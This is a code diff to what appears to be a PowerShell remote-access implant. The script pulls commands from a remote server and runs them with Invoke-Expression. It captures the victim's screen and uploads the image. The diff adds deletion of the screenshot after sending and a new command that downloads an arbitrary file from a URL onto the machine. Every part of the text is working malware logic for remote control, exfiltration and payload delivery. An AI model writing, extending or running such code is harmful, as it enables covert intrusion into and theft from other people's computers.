@@ -25,6 +25,7 @@ function sendpics() {
     #Command will store data in 
     $picture=Invoke-RestMethod -Method POST -Uri $Url -Headers $dict -ContentType $content -InFile "C:\Users\Public\screenshot.png" | Out-String
     $picture=$picture.Split(';')[0]
+    Remove-Item "C:\Users\Public\screenshot.png"
     #echo $picture
     return $picture
 }
@@ -45,6 +46,7 @@ function getcmd() {
    
     return $cmd
 }
+
 
 function getNum() {
     $number=Invoke-RestMethod -Method POST -Uri $Url -Body $Body -ContentType "application/json"
@@ -68,7 +70,7 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 $exec_cmd=getcmd | Out-String
 #echo $exec_cmd
 $all=$exec_cmd.Split(",") | Out-String
-#echo $all
+echo $all
 
 [string]$i = ""
 
@@ -76,7 +78,7 @@ foreach ($d in $all) {
 ###Send cmd output to chat!
     $exec_cmd = $d
     $exec_cmd=$exec_cmd.Trim()
-   # echo $exec_cmd
+    echo $exec_cmd
     if ($exec_cmd -eq "pic") {
          $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)
          screenshot $bounds "C:\Users\Public\screenshot.png"
@@ -84,7 +86,16 @@ foreach ($d in $all) {
        #  echo $cmd 
          sendmsg
          break
-}
+    }
+    ##work in progress##
+    if ($exec_cmd.Contains("upload")) {
+        #echo $exec_cmd
+        $uri=$exec_cmd.Split(" ")[1]
+        $fileOut=$exec_cmd.Split(" ")[2]
+        Invoke-WebRequest $uri -outfile $fileOut 
+        #echo "made it here"
+        break
+    }
     $tmp=Invoke-Expression -Command $exec_cmd
     $exec_cmd += $tmp | Out-String
     $count=$exec_cmd.Length
